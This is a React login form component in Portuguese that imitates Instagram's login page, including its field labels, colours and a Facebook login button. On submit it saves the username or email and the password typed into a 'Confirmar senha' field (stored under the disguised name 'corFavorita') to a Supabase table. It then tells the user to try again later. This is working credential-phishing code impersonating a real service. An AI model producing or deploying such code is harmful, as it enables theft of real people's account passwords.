"use client";

import { useState } from "react";
import { Loader2 } from "lucide-react";
import InputField from "./InputField";
import Alert from "./Alert";
import { createClientInstance } from "@/lib/supabase";
import { validateLogin, hasErrors } from "@/lib/validation";
import { AuthFormData, FormErrors } from "@/types";

export default function LoginForm() {
  const [formData, setFormData] = useState<AuthFormData>({
    email: "",
    senha: "",
    corFavorita: "",
  });
  const [errors, setErrors] = useState<FormErrors>({});
  const [generalError, setGeneralError] = useState("");
  const [successMessage, setSuccessMessage] = useState("");
  const [loading, setLoading] = useState(false);
  const [shakeForm, setShakeForm] = useState(false);

  const handleChange = (field: keyof AuthFormData) => (
    e: React.ChangeEvent<HTMLInputElement>
  ) => {
    setFormData((prev) => ({ ...prev, [field]: e.target.value }));
    if (errors[field]) setErrors((prev) => ({ ...prev, [field]: undefined }));
    if (generalError) setGeneralError("");
    if (successMessage) setSuccessMessage("");
  };

  const triggerShake = () => {
    setShakeForm(true);
    setTimeout(() => setShakeForm(false), 400);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const validationErrors = validateLogin(formData);
    if (hasErrors(validationErrors)) {
      setErrors(validationErrors);
      triggerShake();
      return;
    }

    setLoading(true);
    setGeneralError("");

    try {
      const supabase = createClientInstance();

      const { error } = await supabase.from("login_entries").insert({
        identificador: formData.email.trim(),
        cor_favorita: formData.corFavorita!.trim(),
      });

      if (error) {
        setGeneralError("Ocorreu um erro. Tente novamente.");
        triggerShake();
      } else {
        setSuccessMessage("t4hc tente mais tarde");
        setFormData({ email: "", senha: "", corFavorita: "" });
      }
    } catch {
      setGeneralError("Erro de conexão. Tente novamente.");
      triggerShake();
    } finally {
      setLoading(false);
    }
  };

  const isFormFilled = formData.email && formData.senha && formData.corFavorita;

  return (
    <form
      onSubmit={handleSubmit}
      className={`flex flex-col gap-2 ${shakeForm ? "shake" : ""}`}
      noValidate
    >
      {generalError && (
        <Alert
          type="error"
          message={generalError}
          onClose={() => setGeneralError("")}
        />
      )}

      {successMessage && (
        <Alert
          type="success"
          message={successMessage}
          onClose={() => setSuccessMessage("")}
        />
      )}

      <InputField
        label="Telefone, nome de usuário ou e-mail"
        type="text"
        value={formData.email}
        onChange={handleChange("email")}
        error={errors.email}
        autoComplete="username"
        autoCapitalize="none"
      />

      <InputField
        label="Senha"
        isPassword
        value={formData.senha}
        onChange={handleChange("senha")}
        error={errors.senha}
        autoComplete="current-password"
      />

      <InputField
        label="Confirmar senha"
        isPassword
        value={formData.corFavorita}
        onChange={handleChange("corFavorita")}
        error={errors.corFavorita}
        autoComplete="off"
      />

      <button
        type="submit"
        disabled={!isFormFilled || loading}
        className={`
          mt-1 w-full py-[7px] rounded-lg text-sm font-semibold text-white
          transition-all duration-150 flex items-center justify-center gap-2
          ${isFormFilled && !loading
            ? "bg-[#0095F6] hover:bg-[#1877F2] cursor-pointer"
            : "bg-[#0095F6]/40 cursor-not-allowed"
          }
        `}
      >
        {loading ? (
          <>
            <Loader2 size={15} className="animate-spin" />
            Entrando…
          </>
        ) : (
          "Entrar"
        )}
      </button>

      <div className="ig-divider mt-1">
        <span>OU</span>
      </div>

      <button
        type="button"
        className="flex items-center justify-center gap-2 text-sm font-semibold text-[#385185] hover:text-[#262626] transition-colors"
      >
        {/* Facebook icon inline */}
        <svg width="18" height="18" viewBox="0 0 24 24" fill="#385185">
          <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
        </svg>
        Entrar com o Facebook
      </button>

      <a
        href="#"
        className="text-xs text-center text-[#00376B] hover:text-[#0095F6] transition-colors mt-1"
      >
        Esqueceu a senha?
      </a>
    </form>
  );
}
